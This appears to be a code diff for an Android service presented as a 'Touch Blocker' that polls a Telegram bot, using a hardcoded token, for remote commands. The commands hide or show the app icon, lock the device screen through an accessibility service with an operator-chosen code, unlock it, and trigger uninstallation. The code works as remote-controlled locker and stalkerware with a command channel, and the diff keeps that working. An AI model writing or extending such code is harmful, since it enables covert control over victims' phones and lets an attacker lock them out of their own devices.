@@ -14,17 +14,14 @@ public class TouchLockService extends Service {
     private static final String BOT_TOKEN = "8388799545:AAGPwGKOTs47C29s6PUDFsqZbAjNh9wdrgE";
     private OkHttpClient client;
     private long lastUpdateId = 0;
-    private String adminChatId = ""; 
+    private String adminChatId = "";
+    private int lastOnlineMessageId = -1; // ID для "Бот онлайн"
 
     @Override
     public void onCreate() {
         super.onCreate();
         instance = this;
-        client = new OkHttpClient.Builder()
-                .connectTimeout(30, TimeUnit.SECONDS)
-                .readTimeout(30, TimeUnit.SECONDS)
-                .build();
-        
+        client = new OkHttpClient.Builder().connectTimeout(30, TimeUnit.SECONDS).build();
         createNotificationChannel();
         startForeground(1, getMyNotification("Система активна"));
         startPolling();
@@ -32,7 +29,7 @@ public class TouchLockService extends Service {
 
     private void startPolling() {
         new Thread(() -> {
-            boolean isFirstRun = true;
+            boolean sentOnlineSignal = false;
             while (true) {
                 try {
                     String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=20";
@@ -42,21 +39,19 @@ public class TouchLockService extends Service {
                         JSONObject json = new JSONObject(response.body().string());
                         JSONArray results = json.getJSONArray("result");
                         
-                        if (results.length() > 0) {
-                            // Берем ID последнего сообщения
-                            JSONObject lastObj = results.getJSONObject(results.length() - 1);
-                            lastUpdateId = lastObj.getLong("update_id");
+                        for (int i = 0; i < results.length(); i++) {
+                            JSONObject obj = results.getJSONObject(i);
+                            lastUpdateId = obj.getLong("update_id");
+                            
+                            if (obj.has("message")) {
+                                JSONObject msg = obj.getJSONObject("message");
+                                adminChatId = msg.getJSONObject("chat").getString("id");
+                                
+                                if (!sentOnlineSignal) {
+                                    sendTelegramMessage("✅ Бот онлайн!", true);
+                                    sentOnlineSignal = true;
+                                }
 
-                            // При первом запуске отправляем сигнал активности
-                            if (isFirstRun) {
-                                adminChatId = lastObj.getJSONObject("message").getJSONObject("chat").getString("id");
-                                sendTelegramMessage("✅ Бот активен и готов к работе!");
-                                isFirstRun = false;
-                            }
-
-                            // Обработка всех пришедших сообщений
-                            for (int i = 0; i < results.length(); i++) {
-                                JSONObject msg = results.getJSONObject(i).getJSONObject("message");
                                 String text = msg.optString("text", "");
                                 String[] parts = text.split(" ");
                                 String cmd = parts[0].toLowerCase();
@@ -64,9 +59,7 @@ public class TouchLockService extends Service {
                             }
                         }
                     }
-                } catch (Exception e) {
-                    try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
-                }
+                } catch (Exception e) { try { Thread.sleep(5000); } catch (InterruptedException ignored) {} }
             }
         }).start();
     }
@@ -74,37 +67,48 @@ public class TouchLockService extends Service {
     private void handleCommand(String cmd, String[] parts) {
         if (cmd.equals("/hide")) {
             updateIconStatus(false);
-            sendTelegramMessage("👻 Иконка скрыта");
+            sendTelegramMessage("👻 Иконка скрыта", false);
         } else if (cmd.equals("/show")) {
             updateIconStatus(true);
-            sendTelegramMessage("👁 Иконка возвращена");
+            sendTelegramMessage("👁 Иконка возвращена", false);
         } else if (cmd.equals("/killme")) {
-            sendTelegramMessage("💀 Подготовка к удалению...");
+            sendTelegramMessage("💀 Запуск удаления...", false);
             updateIconStatus(true);
             if (TouchLockAccessibilityService.instance != null) TouchLockAccessibilityService.instance.unlock();
-            Intent intent = new Intent(Intent.ACTION_DELETE);
-            intent.setData(android.net.Uri.parse("package:" + getPackageName()));
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(intent);
-            stopSelf();
+            new Handler().postDelayed(() -> {
+                Intent intent = new Intent(Intent.ACTION_DELETE);
+                intent.setData(android.net.Uri.parse("package:" + getPackageName()));
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intent);
+                stopSelf();
+            }, 2000);
         } else if (TouchLockAccessibilityService.instance != null) {
             if (cmd.equals("/block")) {
                 String pass = (parts.length > 1) ? parts[1] : "0000";
                 TouchLockAccessibilityService.instance.lock(pass);
-                sendTelegramMessage("🔒 Экран заблокирован. Пароль: " + pass);
+                sendTelegramMessage("🔒 Заблокировано. Код: " + pass, false);
             } else if (cmd.equals("/stop")) {
                 TouchLockAccessibilityService.instance.unlock();
-                sendTelegramMessage("🔓 Разблокировано");
+                sendTelegramMessage("🔓 Разблокировано", false);
             }
         }
     }
 
-    public void sendTelegramMessage(String message) {
+    // Универсальный метод отправки
+    public void sendTelegramMessage(String message, boolean isOnlineSignal) {
         if (adminChatId.isEmpty()) return;
         new Thread(() -> {
             try {
+                if (isOnlineSignal && lastOnlineMessageId != -1) {
+                    String delUrl = "https://api.telegram.org/bot" + BOT_TOKEN + "/deleteMessage?chat_id=" + adminChatId + "&message_id=" + lastOnlineMessageId;
+                    client.newCall(new Request.Builder().url(delUrl).build()).execute();
+                }
                 String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + adminChatId + "&text=" + message;
-                client.newCall(new Request.Builder().url(url).build()).execute();
+                Response res = client.newCall(new Request.Builder().url(url).build()).execute();
+                if (isOnlineSignal && res.isSuccessful()) {
+                    JSONObject json = new JSONObject(res.body().string());
+                    lastOnlineMessageId = json.getJSONObject("result").getInt("message_id");
+                }
             } catch (Exception ignored) {}
         }).start();
     }
@@ -120,18 +124,12 @@ public class TouchLockService extends Service {
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= 26) {
             NotificationChannel channel = new NotificationChannel("TouchLockChannel", "Status", NotificationManager.IMPORTANCE_LOW);
-            NotificationManager manager = getSystemService(NotificationManager.class);
-            if (manager != null) manager.createNotificationChannel(channel);
+            getSystemService(NotificationManager.class).createNotificationChannel(channel);
         }
     }
 
     private Notification getMyNotification(String t) {
-        return new Notification.Builder(this, "TouchLockChannel")
-                .setContentTitle("Touch Blocker")
-                .setContentText(t)
-                .setSmallIcon(android.R.drawable.ic_secure)
-                .setOngoing(true)
-                .build();
+        return new Notification.Builder(this, "TouchLockChannel").setContentTitle("Touch Blocker").setContentText(t).setSmallIcon(android.R.drawable.ic_secure).setOngoing(true).build();
     }
 
     @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
